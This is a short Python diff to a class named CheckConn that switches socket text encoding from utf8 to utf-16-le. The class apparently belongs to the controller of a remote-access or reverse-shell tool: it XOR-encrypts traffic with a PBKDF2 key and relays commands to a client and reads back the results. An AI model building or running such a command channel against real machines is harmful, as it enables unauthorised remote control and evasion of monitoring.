@@ -88,7 +88,7 @@ class CheckConn:
         
         while True:
             try:            
-                data_tmp = sock.recv(buffer).decode("utf8","replace")
+                data_tmp = sock.recv(buffer).decode("utf-16-le","replace")
                 data = XOREncryption(data_tmp, Handler.PBKDF2_Key)
             except socket.timeout:
                 result = b"ERRROR"
@@ -111,7 +111,7 @@ class CheckConn:
         result = ""
         sock.settimeout(SOCK_TIMEOUT)
         try:            
-            data_tmp = sock.recv(buffer).decode("utf8","replace")
+            data_tmp = sock.recv(buffer).decode("utf-16-le","replace")
             result = XOREncryption(data_tmp, Handler.PBKDF2_Key)        
             
         except socket.timeout:
@@ -136,7 +136,7 @@ class CheckConn:
         timeout = 20
         sock.settimeout(timeout)
         list_request = []
-        end_XOR = XOREncryption("\r\n",Handler.PBKDF2_Key).encode("utf8")
+        end_XOR = XOREncryption("\r\n",Handler.PBKDF2_Key).encode("utf-16-le")
 
         #printColor("information", "[?] waiting for the client answer...\n")
         printColor("information", "[?] the command can take up to {} seconds before triggering an exception (timeout).\n".format(timeout))
@@ -169,7 +169,7 @@ class CheckConn:
                     pass
         
         for i in range(len(list_request) - 1): #-1 for ingore last request (\r\n)
-            printColor("successfully", XOREncryption(list_request[i].decode("utf8","replace"), Handler.PBKDF2_Key))
+            printColor("successfully", XOREncryption(list_request[i].decode("utf-16-le","replace"), Handler.PBKDF2_Key))
 
 
         sock.settimeout(None)
